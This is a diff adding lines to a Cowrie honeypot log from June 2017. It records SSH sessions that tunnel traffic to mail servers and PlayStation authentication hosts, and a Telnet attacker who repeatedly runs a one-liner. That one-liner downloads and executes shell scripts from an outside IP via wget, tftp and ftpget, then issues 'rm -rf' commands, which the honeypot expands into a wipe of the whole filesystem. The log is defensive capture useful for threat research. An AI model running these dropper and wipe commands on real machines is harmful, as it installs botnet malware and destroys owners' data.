@@ -550,3 +550,198 @@
 2017-06-17T15:57:00+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3404,91.195.103.216] sending close 57
 2017-06-17T15:57:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3404,91.195.103.216] got channel 'direct-tcpip' request
 2017-06-17T15:57:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3404,91.195.103.216] direct-tcp connection request to 98.136.217.203:25 from localhost:5556
+2017-06-17T15:57:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] got channel 'direct-tcpip' request
+2017-06-17T15:57:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] direct-tcp connection request to 23.0.37.229:443 from localhost:5556
+2017-06-17T15:57:01+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] direct-tcp forward to 23.0.37.229:443 with data "\x16\x03\x03\x01y\x01\x00\x01u\x03\x03YEQ\x1e\x87\xcec+\xbd\xaeK3\xe6X\xce\x8d\x08+t6\xf7QW\xe3\xc0\xa3\xedU\xe5O\xd0\x8b\x00\x004\xc0(\xc0'\xc0\x14\xc0\x13\x00\x9f\x00\x9e\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\xc0,\xc0+\xc0$\xc0#\xc0\n\xc0\t\x00j\x00@\x008\x002\x00\n\x00\x13\x00\x05\x00\x04\x01\x00\x01\x18\x00\x00\x00\x1f\x00\x1d\x00\x00\x1aauth.np.ac.playstation.net\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00\r\x00\x14\x00\x12\x06\x01\x06\x03\x04\x01\x05\x01\x02\x01\x04\x03\x05\x03\x02\x03\x02\x02\x00#\x00\xc0\x00\x00\x19\x9e\xbdi\xc9;\r\xe0\xf1\x01 \xed\x16n+e\xd5Fp(\x94\x02\xd7\xbc\xec\xd6\x04o-\xae\x90\xde2\xd4N\xb44\x18wK\xc4P\xd6\xb6\x93\xb3$\xe1A\xf2+\xd9\xea\xcb~\xe3\xa8\xcf\xb7!\n^}\xed\x8b-\xed\xa8P&\xe9(\xa7R\xb2]Xl\xea\x1e\xb2I\xac\xcf\x96K\xf3{y\x9fd .\xc4gz\xea\x08\x14\x05\x84\xf0\x161\x00\xb7\xed\xfc\xcd\r\xe5\x1c\x9a\x863\n)\x07\xb3\xcc\x1b\xfd/\xe3\t\xa3*\xfcwq\xed>\xe3B=-d`Ssh\xf4\x97\xbb\xc2u\xdd\xa0\xb86\xcd\xa2\xe9\\\x02J^\x85>\x95\x9b\xa8\x0bn,\xad=O|\xcb\xb3|_U=\xa7\xc2d[\x08LJ\xe2\xf7u\xcd\xdbH\x93\x18\x00\x17\x00\x00\xff\x01\x00\x01\x00"
+2017-06-17T15:57:01+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] failed to connect: Connection refused
+2017-06-17T15:57:01+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] sending close 31
+2017-06-17T15:57:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-17T15:57:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp connection request to 104.44.194.237:25 from localhost:5556
+2017-06-17T15:57:02+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:16699 (10.8.41.81:2222) [session: 63d3306b]
+2017-06-17T15:57:03+0000 [HoneyPotSSHTransport,3561,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T15:57:03+0000 [HoneyPotSSHTransport,3561,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T15:57:03+0000 [HoneyPotSSHTransport,3561,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T15:57:03+0000 [HoneyPotSSHTransport,3561,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T15:57:05+0000 [HoneyPotSSHTransport,3561,113.195.145.52] NEW KEYS
+2017-06-17T15:57:05+0000 [SSHChannel None (58) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3404,91.195.103.216] remote eof
+2017-06-17T15:57:05+0000 [SSHChannel None (58) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3404,91.195.103.216] remote close
+2017-06-17T15:57:05+0000 [SSHChannel None (58) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3404,91.195.103.216] sending close 58
+2017-06-17T15:57:05+0000 [HoneyPotSSHTransport,3561,113.195.145.52] starting service 'ssh-userauth'
+2017-06-17T15:57:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3561,113.195.145.52] 'root' trying auth 'none'
+2017-06-17T15:57:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3561,113.195.145.52] 'root' authenticated with 'none'
+2017-06-17T15:57:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3561,113.195.145.52] starting service 'ssh-connection'
+2017-06-17T15:57:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-17T15:57:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp connection request to 64.233.164.26:25 from localhost:5556
+2017-06-17T15:57:08+0000 [HoneyPotSSHTransport,3561,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-17T15:57:08+0000 [HoneyPotSSHTransport,3561,113.195.145.52] avatar root logging out
+2017-06-17T15:57:08+0000 [HoneyPotSSHTransport,3561,113.195.145.52] connection lost
+2017-06-17T15:57:08+0000 [HoneyPotSSHTransport,3561,113.195.145.52] Connection lost after 5 seconds
+2017-06-17T15:57:09+0000 [CowrieTelnetTransport,2616,223.64.97.182] CMD: sh
+2017-06-17T15:57:09+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: sh 
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/baws123.sh; chmod 777 baws123.sh; sh baws123.sh; tftp 104.237.203.150 -c get troute1.sh; chmod 777 troute1.sh; sh troute1.sh; tftp -r troute2.sh -g 104.237.203.150; chmod 777 troute2.sh; sh troute2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 troute.sh troute.sh; sh troute.sh; rm -rf baws123.sh troute.sh troute1.sh troute2.sh; rm -rf *
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /tmp
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /var/run
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /mnt
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /root
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /
+2017-06-17T15:57:13+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: wget http://104.237.203.150/baws123.sh
+2017-06-17T15:57:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://104.237.203.150/baws123.sh>
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Not storing duplicate content d79b9dda9048a8c2943a3677ff6022691dcaa0471aa4b38078540ff5f4cc2614
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Downloaded URL (http://104.237.203.150/baws123.sh) with SHA-256 d79b9dda9048a8c2943a3677ff6022691dcaa0471aa4b38078540ff5f4cc2614 to dl/d79b9dda9048a8c2943a3677ff6022691dcaa0471aa4b38078540ff5f4cc2614
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 /baws123.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: sh /baws123.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: tftp 104.237.203.150 -c get troute1.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 troute1.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: sh troute1.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: tftp -r troute2.sh -g 104.237.203.150
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 troute2.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: sh troute2.sh
+2017-06-17T15:57:14+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 troute.sh troute.sh
+2017-06-17T15:57:15+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://104.237.203.150/troute.sh) with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:15+0000 [HTTPPageDownloader,client] Command found: sh /troute.sh
+2017-06-17T15:57:15+0000 [HTTPPageDownloader,client] Command found: rm -rf /baws123.sh /troute.sh troute1.sh troute2.sh
+2017-06-17T15:57:15+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-17T15:57:15+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://104.237.203.150/baws123.sh>
+2017-06-17T15:57:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-17T15:57:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp connection request to 65.54.188.110:25 from localhost:5556
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/baws123.sh; chmod 777 baws123.sh; sh baws123.sh; tftp 104.237.203.150 -c get troute1.sh; chmod 777 troute1.sh; sh troute1.sh; tftp -r troute2.sh -g 104.237.203.150; chmod 777 troute2.sh; sh troute2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 troute.sh troute.sh; sh troute.sh; rm -rf baws123.sh troute.sh troute1.sh troute2.sh; rm -rf *
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /tmp
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /var/run
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /mnt
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /root
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: wget http://104.237.203.150/baws123.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 baws123.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh baws123.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: tftp 104.237.203.150 -c get troute1.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 troute1.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute1.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: tftp -r troute2.sh -g 104.237.203.150
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 troute2.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute2.sh
+2017-06-17T15:57:17+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 troute.sh troute.sh
+2017-06-17T15:57:19+0000 [CowrieTelnetTransport,2616,223.64.97.182] Downloaded URL (ftp://104.237.203.150/troute.sh) with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:19+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute.sh
+2017-06-17T15:57:19+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: rm -rf baws123.sh troute.sh troute1.sh troute2.sh
+2017-06-17T15:57:19+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: rm -rf *
+2017-06-17T15:57:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-17T15:57:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp connection request to 104.44.194.232:25 from localhost:5556
+2017-06-17T15:57:20+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:56845 (10.8.41.81:2222) [session: e532fb22]
+2017-06-17T15:57:21+0000 [HoneyPotSSHTransport,3562,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T15:57:21+0000 [HoneyPotSSHTransport,3562,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T15:57:21+0000 [HoneyPotSSHTransport,3562,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T15:57:21+0000 [HoneyPotSSHTransport,3562,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T15:57:21+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3413,91.230.47.70] got channel 'direct-tcpip' request
+2017-06-17T15:57:21+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3413,91.230.47.70] direct-tcp connection request to 23.59.96.180:443 from localhost:5556
+2017-06-17T15:57:21+0000 [SSHChannel None (43) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3413,91.230.47.70] direct-tcp forward to 23.59.96.180:443 with data "\x16\x03\x03\x00\xc0\x01\x00\x00\xbc\x03\x03YEQ-\xef\xa7/\xb6\xdaIb\x1f\x19G\xfd\xbc\xd9&S\x16\x99\xde\xdf\nh\xec#\x10\x83\xad\xc7\x80\x00\x00.\xc0,\xc0+\xc00\xc0/\x00\x9f\x00\x9e\xc0$\xc0#\xc0(\xc0'\xc0\n\xc0\t\xc0\x14\xc0\x13\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\x00\n\x00\x05\x00\x04\x01\x00\x00e\x00\x00\x00*\x00(\x00\x00%auth.api.sonyentertainmentnetwork.com\x00\n\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00\r\x00\x14\x00\x12\x04\x01\x05\x01\x02\x01\x04\x03\x05\x03\x02\x03\x02\x02\x06\x01\x06\x03\x00#\x00\x00\x00\x17\x00\x00\xff\x01\x00\x01\x00"
+2017-06-17T15:57:21+0000 [SSHChannel None (43) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3413,91.230.47.70] failed to connect: Connection refused
+2017-06-17T15:57:21+0000 [SSHChannel None (43) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3413,91.230.47.70] sending close 43
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/baws123.sh; chmod 777 baws123.sh; sh baws123.sh; tftp 104.237.203.150 -c get troute1.sh; chmod 777 troute1.sh; sh troute1.sh; tftp -r troute2.sh -g 104.237.203.150; chmod 777 troute2.sh; sh troute2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 troute.sh troute.sh; sh troute.sh; rm -rf baws123.sh troute.sh troute1.sh troute2.sh; rm -rf *
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /tmp
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /var/run
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /mnt
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /root
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: wget http://104.237.203.150/baws123.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 baws123.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh baws123.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: tftp 104.237.203.150 -c get troute1.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 troute1.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute1.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: tftp -r troute2.sh -g 104.237.203.150
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 troute2.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute2.sh
+2017-06-17T15:57:21+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 /troute.sh /troute.sh
+2017-06-17T15:57:23+0000 [CowrieTelnetTransport,2616,223.64.97.182] Downloaded URL (ftp://104.237.203.150//troute.sh) with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:23+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute.sh
+2017-06-17T15:57:23+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: rm -rf baws123.sh troute.sh troute1.sh troute2.sh
+2017-06-17T15:57:23+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: rm -rf *
+2017-06-17T15:57:25+0000 [SSHChannel None (141) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:25+0000 [SSHChannel None (141) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:25+0000 [SSHChannel None (141) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 141
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.237.203.150/baws123.sh; chmod 777 baws123.sh; sh baws123.sh; tftp 104.237.203.150 -c get troute1.sh; chmod 777 troute1.sh; sh troute1.sh; tftp -r troute2.sh -g 104.237.203.150; chmod 777 troute2.sh; sh troute2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 troute.sh troute.sh; sh troute.sh; rm -rf baws123.sh troute.sh troute1.sh troute2.sh; rm -rf *
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /tmp
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /var/run
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /mnt
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /root
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: cd /
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: wget http://104.237.203.150/baws123.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 baws123.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh baws123.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: tftp 104.237.203.150 -c get troute1.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 troute1.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute1.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: tftp -r troute2.sh -g 104.237.203.150
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: chmod 777 troute2.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute2.sh
+2017-06-17T15:57:25+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command found: ftpget -v -u anonymous -p anonymous -P 21 104.237.203.150 /troute.sh /troute.sh
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Downloaded URL (ftp://104.237.203.150//troute.sh) with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: sh troute.sh
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: rm -rf baws123.sh troute.sh troute1.sh troute2.sh
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Command not found: rm -rf *
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Not storing duplicate content 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Saved redir contents with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Not storing duplicate content 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Saved redir contents with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Not storing duplicate content 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Saved redir contents with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Not storing duplicate content 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Saved redir contents with SHA-256 09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7 to dl/09590e1d156578e7815153717099f1ff3dbcef3efcfc44aa53436392884539d7
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Not storing duplicate content d79b9dda9048a8c2943a3677ff6022691dcaa0471aa4b38078540ff5f4cc2614
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Saved redir contents with SHA-256 d79b9dda9048a8c2943a3677ff6022691dcaa0471aa4b38078540ff5f4cc2614 to dl/d79b9dda9048a8c2943a3677ff6022691dcaa0471aa4b38078540ff5f4cc2614
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Closing TTY Log: log/tty/20170617-155655-None-2616i.log after 31 seconds
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-17T15:57:26+0000 [CowrieTelnetTransport,2616,223.64.97.182] Connection lost after 64 seconds
+2017-06-17T15:57:26+0000 [HoneyPotSSHTransport,3562,113.195.145.52] NEW KEYS
+2017-06-17T15:57:26+0000 [HoneyPotSSHTransport,3562,113.195.145.52] starting service 'ssh-userauth'
+2017-06-17T15:57:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3562,113.195.145.52] 'root' trying auth 'none'
+2017-06-17T15:57:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3562,113.195.145.52] 'root' authenticated with 'none'
+2017-06-17T15:57:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,3562,113.195.145.52] starting service 'ssh-connection'
+2017-06-17T15:57:30+0000 [HoneyPotSSHTransport,3562,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-17T15:57:30+0000 [HoneyPotSSHTransport,3562,113.195.145.52] avatar root logging out
+2017-06-17T15:57:30+0000 [HoneyPotSSHTransport,3562,113.195.145.52] connection lost
+2017-06-17T15:57:30+0000 [HoneyPotSSHTransport,3562,113.195.145.52] Connection lost after 9 seconds
+2017-06-17T15:57:32+0000 [SSHChannel None (142) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:32+0000 [SSHChannel None (142) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:32+0000 [SSHChannel None (142) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 142
+2017-06-17T15:57:36+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:12710 (10.8.41.81:2222) [session: 3e08e968]
+2017-06-17T15:57:41+0000 [HoneyPotSSHTransport,3563,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T15:57:41+0000 [HoneyPotSSHTransport,3563,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T15:57:41+0000 [HoneyPotSSHTransport,3563,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T15:57:41+0000 [HoneyPotSSHTransport,3563,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T15:57:42+0000 [SSHChannel None (143) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:42+0000 [SSHChannel None (143) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:42+0000 [SSHChannel None (143) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 143
+2017-06-17T15:57:43+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-17T15:57:43+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp connection request to 68.178.213.243:25 from localhost:5556
+2017-06-17T15:57:44+0000 [SSHChannel None (144) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp forward to 74.125.69.26:25 with data 'QUIT\r\n'
+2017-06-17T15:57:44+0000 [SSHChannel None (144) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] failed to connect: Connection refused
+2017-06-17T15:57:44+0000 [SSHChannel None (144) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 144
+2017-06-17T15:57:44+0000 [SSHChannel None (144) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:44+0000 [SSHChannel None (144) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:44+0000 [HoneyPotSSHTransport,3563,113.195.145.52] connection lost
+2017-06-17T15:57:44+0000 [HoneyPotSSHTransport,3563,113.195.145.52] Connection lost after 8 seconds
+2017-06-17T15:57:46+0000 [SSHChannel None (145) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp forward to 104.44.194.236:25 with data 'QUIT\r\n'
+2017-06-17T15:57:46+0000 [SSHChannel None (145) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] failed to connect: Connection refused
+2017-06-17T15:57:46+0000 [SSHChannel None (145) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 145
+2017-06-17T15:57:46+0000 [SSHChannel None (145) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
